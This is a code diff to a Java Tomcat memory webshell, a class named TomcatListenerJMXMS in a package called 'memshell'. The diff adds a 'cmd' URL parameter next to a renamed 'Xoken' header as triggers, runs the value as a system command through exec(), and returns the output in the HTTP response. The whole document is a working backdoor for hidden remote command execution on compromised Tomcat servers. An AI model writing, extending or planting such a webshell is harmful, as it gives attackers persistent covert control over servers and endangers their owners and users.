@@ -1,6 +1,7 @@
 package com.demo.memshell.exec;
 
 import com.sun.jmx.mbeanserver.NamedObject;
+import org.apache.catalina.connector.Response;
 
 import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
@@ -17,7 +18,8 @@ import java.util.Set;
  * Tomcat 7 8 9
  */
 public class TomcatListenerJMXMS implements ServletRequestListener {
-    private static String header = "X-Token";
+    private static String HEADER = "Xoken";
+    private static String PARAM = "cmd";
     public TomcatListenerJMXMS() {
 
     }
@@ -54,13 +56,20 @@ public class TomcatListenerJMXMS implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
-            String cmd = httpServletRequest.getHeader(header);
-            if (cmd == null) {
+            String cmd = httpServletRequest.getHeader(HEADER);
+            String parameter = httpServletRequest.getParameter(PARAM);
+            String result;
+            if (cmd != null) {
+                result = exec(cmd);
+            } else if (parameter != null) {
+                result = exec(parameter);
+            } else {
                 return;
             }
-            String result = exec(cmd);
             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
-            PrintWriter printWriter = request.getResponse().getWriter();
+            Response response = request.getResponse();
+            response.setStatus(200);
+            PrintWriter printWriter = response.getWriter();
             printWriter.println(result);
         } catch (Exception e) {
 
